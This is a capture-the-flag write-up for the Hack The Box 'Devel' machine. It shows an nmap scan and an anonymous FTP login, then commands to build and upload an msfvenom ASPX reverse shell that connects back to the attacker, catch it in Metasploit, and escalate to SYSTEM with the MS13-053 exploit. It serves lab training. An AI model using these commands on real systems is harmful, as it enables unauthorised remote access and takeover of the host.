# Hack the box - Devel

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.5</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Mar 15</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.5
```
![Nmap results](./nmap.png)

We can see there is anonymous FTP login on port 21. Let's try to login with anonymous:anonymous:

![FTP login](ftp_login.png)

Successful login with FTP. We can see that there is web server files inside.
___

## Exploitation

Since server uses aspx let's make reverse shell using msfvenom:

```
msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=10.10.x.x LPORT=4444
```

![Msfvenom](msfvenom.png)

![File upload](file_upload.png)

When reverse shell file is uploaded on server, we can open metasploit and use meterpreter:

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.x.x
set lport 4444
run
```

![Exploitation](exploitation.png)

## Privilege escalation

Time to gather information about system so we can potentialy escalate privileges:

![System information](system_information.png)

Machine uses Microsoft Windows 7 Enterprise operating system, lets try local exploit suggester tool:

```
Ctrl+c -> y
background
set session 1
run
```

![Local exploit suggester](local_exploit_suggester.png)

We can see that machine is vulnerable for couple of exploits. 3rd one seems to work:

```
use exploit/windows/local/ms13_053_schlamperei
set session 1
run
set lhost 10.10.x.x
run
```

![Privilege escalation](privilege_escalation.png)

We have system user rights. Time to finish the challenge:

![Flags capture](flags_capture.png)